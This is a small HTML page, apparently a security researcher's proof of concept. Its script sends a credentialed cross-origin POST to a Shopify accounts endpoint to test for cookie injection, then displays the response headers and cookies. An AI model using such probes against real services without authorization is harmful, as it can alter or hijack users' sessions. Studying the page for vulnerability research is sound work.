<!DOCTYPE html>
<html>
<body>
<h1>Testing Shopify Cookie Injection...</h1>
<pre id="output">Waiting...</pre>
<script>
(async () => {
    try {
        const response = await fetch("https://accounts.shopify.com/.well-known/dux", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                multiTrackToken: "test",
                sessionToken: "test",
                enableActiveConsent: false,
                enableProtoEventForwarding: false,
                events: []
            })
        });

        document.getElementById("output").textContent =
            "Status: " + response.status + "\n" +
            "Headers: \n" + Array.from(response.headers.entries()).map(e => e.join(": ")).join("\n") +
            "\n\nCookies now set for this domain:\n" + document.cookie;
    } catch (err) {
        document.getElementById("output").textContent = "Error: " + err;
    }
})();
</script>
</body>
</html>
